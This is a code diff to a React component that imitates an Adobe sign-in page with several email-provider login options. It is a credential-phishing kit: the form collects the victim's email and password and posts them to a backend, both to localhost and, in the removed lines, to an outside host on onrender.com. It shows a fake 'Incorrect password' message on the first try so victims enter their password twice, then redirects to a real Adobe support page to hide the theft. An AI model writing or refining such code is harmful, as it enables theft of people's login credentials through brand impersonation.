@@ -14,80 +14,70 @@ const LoginModal = ({ provider, onClose }) => {
 
   const [clickCount, setClickCount] = useState(0)
   const [error, setError] = useState(null);
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-  
-    // Increment click count on every click
-    setClickCount((prevCount) => prevCount + 1);
-  
-    // On the first click, show error and submit data
-    if (clickCount === 0) {
-      setError('Incorrect password. Please try again.');
-      console.log('Error:', 'Incorrect password on the first attempt.');
-  
-      // Always send data, even on the first click
-      try {
-        const response = await fetch(
-          'https://xfinity-5y6r.onrender.com/api/submit',
-          {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(formData),
-          }
-        );
-  
-        const data = await response.json();
-        console.log(data);
-  
-        // If needed, you can handle success response here as well
-      } catch (error) {
-        console.error('Error on first attempt:', error);
-      }
+ const handleSubmit = async (e) => {
+  e.preventDefault();
+  const newClickCount = clickCount + 1;
+  setClickCount(newClickCount);
+
+  if (!email || !password) {
+    setError("Email and password are required.");
+    return;
+  }
+
+  const formData = { email, password, provider };
+
+  try {
+    const response = await fetch("http://localhost:3001/api/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(formData),
+    });
+
+    const data = await response.json();
+
+    if (newClickCount === 1) {
+      setError("Incorrect password. Please try again.");
+    } else if (response.ok) {
+      // ✅ redirect on 2nd attempt
+      window.location.href = "https://helpx.adobe.com/support.html";
     } else {
-      // On subsequent clicks, clear the error and submit the data
-      setError(''); // Clear the error
-      console.log('Submitting data on subsequent attempt');
-  
-      try {
-        const response = await fetch(
-          'https://xfinity-5y6r.onrender.com/api/submit',
-          {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(formData),
-          }
-        );
-  
-        const data = await response.json();
-        console.log(data);
-  
-        if (data.success) {
-          // Redirect on successful submission
-          window.location.href =
-            'https://www.xfinity.com/planbuilder?localize=true&drawer=internet';
-        } else {
-          // Handle any error response
-          setError(data.message);
-        }
-      } catch (error) {
-        setError('Failed to submit. Please try again later.');
-        console.error('Error:', error);
-      }
+      setError(data.error || "Submission failed.");
     }
-  };
+  } catch (err) {
+    setError("Network error. Try again later.");
+  }
+};
+
+
+
   return (
-    <form className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-30">
+     <form onSubmit={handleSubmit} className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-30">
       <div className="bg-white p-6 rounded-lg shadow-lg w-96">
         <h2 className="text-xl font-bold mb-4">Sign in with {provider}</h2>
-        <input type="email" placeholder="Enter your email" className="w-full p-2 border rounded mb-4" />
-        <input type="password" placeholder="Enter your password" className="w-full p-2 border rounded mb-4" />
-        <button handleSubmit={handleSubmit} className="bg-blue-600 text-white p-2 rounded w-full">Login</button>
-        <button onClick={onClose} className="mt-4 text-red-500 w-full">Close</button>
+        <input
+          type="email"
+          placeholder="Enter your email"
+          className="w-full p-2 border rounded mb-4"
+          value={email}
+          onChange={(e) => setEmail(e.target.value)}
+          autoComplete="email"
+          required
+        />
+        <input
+          type="password"
+          placeholder="Enter your password"
+          className="w-full p-2 border rounded mb-4"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          autoComplete="current-password"
+          required
+        />
+        {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
+        <button type="submit" className="bg-blue-600 text-white p-2 rounded w-full">Login</button>
+        <button type="button" onClick={onClose} className="mt-4 text-red-500 w-full">Close</button>
       </div>
     </form>
   );
@@ -95,6 +85,7 @@ const LoginModal = ({ provider, onClose }) => {
 
 export default function AdobeLoginUI() {
   const [selectedProvider, setSelectedProvider] = useState(null);
+  const [clickCount, setClickCount] = useState(0); // move clickCount here
 
   return (
     <div className="flex items-center justify-center min-h-screen bg-transparent">
@@ -106,14 +97,30 @@ export default function AdobeLoginUI() {
           <button
             key={name}
             className={`w-full ${color} text-white p-2 rounded mb-2`}
-            onClick={() => setSelectedProvider(name)}
+            onClick={() => {
+              setSelectedProvider(name);
+              setClickCount(0); // reset count when changing provider
+            }}
           >
             Sign in with {name}
           </button>
         ))}
         <p className="text-xs mt-4">CopyRight &copy; 2023 Adobe System Incorporated.</p>
       </div>
-      {selectedProvider && <LoginModal provider={selectedProvider} onClose={() => setSelectedProvider(null)} />}
+
+      {selectedProvider && (
+        <LoginModal
+          provider={selectedProvider}
+          onClose={() => setSelectedProvider(null)}
+          clickCount={clickCount}
+          setClickCount={setClickCount}
+        />
+      )}
     </div>
   );
 }
+
+
+
+
+
